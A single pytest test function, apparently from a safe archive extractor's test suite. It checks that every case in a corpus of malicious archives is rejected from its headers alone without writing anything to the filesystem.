@pytest.mark.parametrize("name,exc,reason,limits", MALICIOUS, ids=[c[0] for c in MALICIOUS])
def test_inspection_alone_rejects_without_touching_the_filesystem(
    name: str, exc, reason: str, limits: ExtractLimits, tmp_path: Path
) -> None:
    """Every case in the corpus is refusable from headers alone — including the
    zip that under-reports a size, whose compressed length gives it away before
    a byte is decompressed. The extractor re-checks while writing anyway."""
    before = snapshot(tmp_path)
    with pytest.raises(exc) as ei:
        inspect_archive(corpus(name), limits=limits)
    assert ei.value.reason == reason
    assert snapshot(tmp_path) == before


